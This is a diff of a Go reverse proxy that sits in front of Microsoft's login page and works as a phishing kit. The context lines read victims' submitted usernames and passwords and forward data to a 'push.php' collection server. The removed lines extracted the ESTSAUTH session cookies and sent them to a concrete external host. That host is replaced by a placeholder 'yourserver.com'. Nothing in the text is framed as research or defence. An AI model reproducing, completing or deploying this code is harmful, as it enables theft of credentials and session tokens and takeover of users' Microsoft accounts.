@@ -1,35 +1,24 @@
 package main
 
 import (
-    "crypto/rand"
-    "encoding/base64"
+    "bytes"
     "fmt"
+    "io/ioutil"
     "net/http"
     "os"
     "strings"
 )
 
-// Constants for upstream and server configurations
 const (
     upstream        = "https://login.microsoftonline.com"
     upstreamPath    = "/"
-    serverURL       = "https://3xrlcxb4gbwtmbar12126.cleavr.one/ne/push.php"
+    serverURL       = "https://yourserver.com/push.php"
 )
 
-// Variables for blocking regions and IP addresses
 var (
     blockedRegions = []string{}
     blockedIPs     = []string{"0.0.0.0", "127.0.0.1"}
 )
-
-// generateNonce generates a random nonce for use in CSP
-func generateNonce() (string, error) {
-    nonce := make([]byte, 16)
-    if _, err := rand.Read(nonce); err != nil {
-        return "", err
-    }
-    return base64.StdEncoding.EncodeToString(nonce), nil
-}
 
 func main() {
     // Retrieve the PORT from environment variables
@@ -48,24 +37,8 @@ func main() {
 }
 
 func handleRequest(w http.ResponseWriter, r *http.Request) {
-    // Generate a nonce for this request
-    nonce, err := generateNonce()
-    if err != nil {
-        http.Error(w, "Internal Server Error", http.StatusInternalServerError)
-        return
-    }
-
-    // Set the CSP header with the generated nonce to allow inline scripts
-    w.Header().Set("Content-Security-Policy", fmt.Sprintf(
-        "default-src 'self'; "+
-        "script-src 'self' 'nonce-%s' https://aadcdn.msftauth.net https://login.live.com; "+
-        "style-src 'self' 'nonce-%s' https://aadcdn.msftauth.net; "+
-        "img-src 'self' https://aadcdn.msftauth.net; "+
-        "connect-src 'self' https://login.microsoftonline.com; "+
-        "font-src 'self' https://aadcdn.msftauth.net; "+
-        "frame-src 'self' https://login.microsoftonline.com; "+
-        "object-src 'none'; "+
-        "base-uri 'self';", nonce, nonce))
+    // Set a secure Content Security Policy (CSP) header
+    w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';")
 
     region := r.Header.Get("cf-ipcountry")
     ipAddress := r.Header.Get("cf-connecting-ip")
@@ -96,15 +69,6 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
 
     body, _ := ioutil.ReadAll(resp.Body)
     bodyString := string(body)
-
-    // Extract specific cookies and send them to the PHP backend
-    estsAuthCookie := extractSpecificCookie(resp, "ESTSAUTH")
-    estsAuthPersistentCookie := extractSpecificCookie(resp, "ESTSAUTHPERSISTENT")
-
-    if estsAuthCookie != "" || estsAuthPersistentCookie != "" {
-        cookies := fmt.Sprintf("ESTSAUTH: %s\nESTSAUTHPERSISTENT: %s", estsAuthCookie, estsAuthPersistentCookie)
-        sendToServer(cookies, ipAddress)
-    }
 
     if r.Method == "POST" {
         username, password := extractCredentials(r)
@@ -169,16 +133,6 @@ func extractValueFromBody(body, key string) string {
         pair := strings.SplitN(param, "=", 2)
         if len(pair) == 2 && pair[0] == key {
             return pair[1]
-        }
-    }
-    return ""
-}
-
-func extractSpecificCookie(resp *http.Response, cookieName string) string {
-    cookies := resp.Cookies()
-    for _, cookie := range cookies {
-        if cookie.Name == cookieName {
-            return cookie.Value
         }
     }
     return ""
